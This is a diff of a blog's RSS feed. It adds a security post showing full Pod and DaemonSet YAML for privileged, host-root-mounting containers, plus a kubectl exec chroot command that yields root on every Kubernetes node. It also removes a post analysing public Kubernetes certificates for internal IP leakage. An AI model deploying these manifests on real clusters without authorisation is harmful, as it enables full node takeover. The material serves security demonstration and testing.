@@ -7,6 +7,96 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>The most pointess Kubernetes command ever</title>
+				<description>&lt;p&gt;Coming up for 4 years ago (a lifetime in Container land) Ian Miell wrote about &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;“The most pointless Docker Command Ever”&lt;/a&gt;.  This was a docker command that you could run and it would return you back as root on your host.&lt;/p&gt;
+
+&lt;p&gt;Far from being useless, this is one of my favourite Docker commands, either to demonstrate to people why things like mounting &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.sock&lt;/code&gt; inside a container is dangerous, or for using as part of security tests where I can create containers, and I’d like to get to the underlying host easily.&lt;/p&gt;
+
+&lt;p&gt;I was thinking today, I wonder what this would look like in Kubernetes…? So I create a quick pod YAML file to test.  You can use this YAML to demonstrate the risks of allowing users to create pods on your cluster, without PodSecurityPolicy setup (of course, I’m sure &lt;strong&gt;all&lt;/strong&gt; production clusters have a PodSecurityPolicy….. right?).&lt;/p&gt;
+
+&lt;p&gt;The YAML is pretty simple, it basically creates a privileged container based on the &lt;code class=&quot;highlighter-rouge&quot;&gt;busybox&lt;/code&gt; image and sets it in an endless loop, waiting for a connection, whilst also setting up the appropriate security flags to make the pod privileged, and also mounting the root directory of the underlying host into &lt;code class=&quot;highlighter-rouge&quot;&gt;/host&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
+kind: Pod
+metadata:
+  name: noderootpod
+  labels:
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: noderootpod
+    image: busybox
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;while true; do sleep 30; done;&quot; ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now to get root on your Kubernetes node you just need to run&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl exec -it noderootpod chroot /host&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;and Hey Presto, you’ll be the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user on the host :)&lt;/p&gt;
+
+&lt;p&gt;Of course, you’re thinking, “that only does one random node” and you’d be right.  To get root shells on all the nodes, what you need is a DaemonSet, which will schedule a Pod onto every node in the cluster.&lt;/p&gt;
+
+&lt;p&gt;The YAML for this is a little more complex, but the essence is the same&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: noderootpod
+  labels:
+spec:
+  selector:
+    matchLabels:
+      name: noderootdaemon
+  template:
+    metadata:
+      labels:
+        name: noderootdaemon
+    spec:
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        effect: NoSchedule
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: noderootpod
+        image: busybox
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+        command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ]
+        args: [ &quot;while true; do sleep 30; done;&quot; ]
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once that’s run just do a &lt;code class=&quot;highlighter-rouge&quot;&gt;kubectl get po&lt;/code&gt; to see your list of pods to choose from, and run the same &lt;code class=&quot;highlighter-rouge&quot;&gt;chroot /host&lt;/code&gt; command on one to get that root on the host feeling…&lt;/p&gt;
+
+&lt;p&gt;If you’ve made it all the way to the bottom of this post, I’ll briefly pimp out my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/index.html#mastering-container-security-140201547156094&quot;&gt;Mastering Container Security&lt;/a&gt; course, which I’m running at Black Hat USA this year, where we’ll be covering this and much much more container security goodness :)&lt;/p&gt;
+</description>
+				<pubDate>Mon, 01 Apr 2019 19:10:39 +0100</pubDate>
+				<link>/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</link>
+				<guid isPermaLink="true">/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</guid>
+			</item>
+		
+			<item>
 				<title>Traefiking in Presentations</title>
 				<description>&lt;p&gt;One of the common tasks in a containerized environment, where you could be running multiple applications in containers on a single host, is “what’s the best way to route traffic to my web applications”?&lt;/p&gt;
 
@@ -466,45 +556,6 @@ Server:
 				<pubDate>Sun, 22 Jul 2018 18:45:39 +0100</pubDate>
 				<link>/blog/2018/07/22/exploring-gvisor/</link>
 				<guid isPermaLink="true">/blog/2018/07/22/exploring-gvisor/</guid>
-			</item>
-		
-			<item>
-				<title>Exploring Public Kuberetes Certificates</title>
-				<description>&lt;p&gt;Yesterday I noticed a &lt;a href=&quot;https://twitter.com/dabdine/status/1019410599401287680&quot;&gt;tweet from Derek Abdine&lt;/a&gt; about the Rapid7 OpenData collections which are free to access datasets of various types, so thought I’d have a quick look at something I’ve been meaning to for a while, information disclosed via SSL certificates in Internet facing Kubernetes clusters.&lt;/p&gt;
-
-&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;
-
-&lt;p&gt;The Kubernetes API server (which generally runs on 443/TCP, 6443/TCP or 8443/TCP) is used to communicate with external and internal cluster components.  As such it tends to have CN or SAN fields which include information relating to the cluster and it’s configuration.  From a security testers point of view it can be handy, as it can let you know things like valid cluster internal IP addresses.  Also the presence of certain specific IP addresses can provide information about the cluster.&lt;/p&gt;
-
-&lt;h2 id=&quot;process&quot;&gt;Process&lt;/h2&gt;
-
-&lt;p&gt;After signing up for &lt;a href=&quot;https://opendata.rapid7.com/&quot;&gt;Open Data&lt;/a&gt; (watch it does take a couple of hours for the approval) I was able to download a SSL certificate dataset from the 19th of June 2018 which covered port 443 available &lt;a href=&quot;https://opendata.rapid7.com/sonar.ssl/20180622/2018-06-22-1529685461-https_get_9443_certs.gz&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;The file has 1187095 certificates, so a reasonable sample.  My approach was to just parse the subjectAltName certificate field for “kubernetes” as in most cases things like kubernetes.svc will apear in every clusters API server certificate.&lt;/p&gt;
-
-&lt;p&gt;Then I just spat out some files with things like DNS names and IP addresses from the SAN fields to see what showed up.&lt;/p&gt;
-
-&lt;h2 id=&quot;results&quot;&gt;Results&lt;/h2&gt;
-
-&lt;p&gt;There were 13271 certificates which matched on kubernetes, so a fair number of public facing clusters exposing their API port.  This isn’t indicative of any particular security problem, however it’s interesting that people are directly exposing clusters, rather than hiding them behind a VPN or other form of security appliance/device.  The potential risk here is that a mistake in configuration on the API server could have bad consequences and as we’ve seen attackers are looking for this sort of thing.&lt;/p&gt;
-
-&lt;p&gt;One thing that was notable was the quantity of internal IP address leakage that you can get from these certificates. There were a couple of thousand with a SAN of “10.100.0.1” which seemed to be the most popular IP address assigned.  This kind of information can be useful for attackers who get an SSRF vulnerability in a cluster application.  When you’re exploiting that kind of issue, part of the problem is guessing valid Internal IP address ranges to probe for unprotected services, so having a certificate give you starting points is very useful.&lt;/p&gt;
-
-&lt;p&gt;Another interesting point amongst the IP address information was the prevalance of the IP address 100.64.0.1 with 1005 of our 13271 certificates having that in their SAN fields.  I’ve noticed in the past that this is indicative of the weave network plugin, so again possibly interesting information for attackers as it gives an idea of the software the cluster is running.&lt;/p&gt;
-
-&lt;p&gt;Turning to the DNS names extracted, it was easy to see that almost every cluster noted had a SAN of “kubernetes.default” listed, not a surprise as this is a default service name in Kubernetes clusters.&lt;/p&gt;
-
-&lt;p&gt;Past this it was interesting to note how many clusters included strings like “dev” and “test” and “internal” in DNS names, indicating that the clusters might not be intended for general use.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion--data&quot;&gt;Conclusion &amp;amp; Data&lt;/h2&gt;
-
-&lt;p&gt;It’s interesting (well for a certain value of interesting) to see what can be derived easily from public data sets, and with this kind of information it could also be interesting to look at trends over time (e.g. what the rate of growth in Kubernetes clusters is).  It’s definitely very nice of Rapid7 to have made this data available for free, a good resource to go poking around in, if you’re interested in this kind of thing.&lt;/p&gt;
-
-&lt;p&gt;I’ve uploaded the script and analyzed data to &lt;a href=&quot;https://github.com/raesene/kubernetes_cert_data&quot;&gt;github&lt;/a&gt;, the raw data is available on Rapid7’s site.&lt;/p&gt;
-</description>
-				<pubDate>Thu, 19 Jul 2018 18:45:39 +0100</pubDate>
-				<link>/blog/2018/07/19/exploring-public-kubernetes-certificates/</link>
-				<guid isPermaLink="true">/blog/2018/07/19/exploring-public-kubernetes-certificates/</guid>
 			</item>
 		
 	</channel>
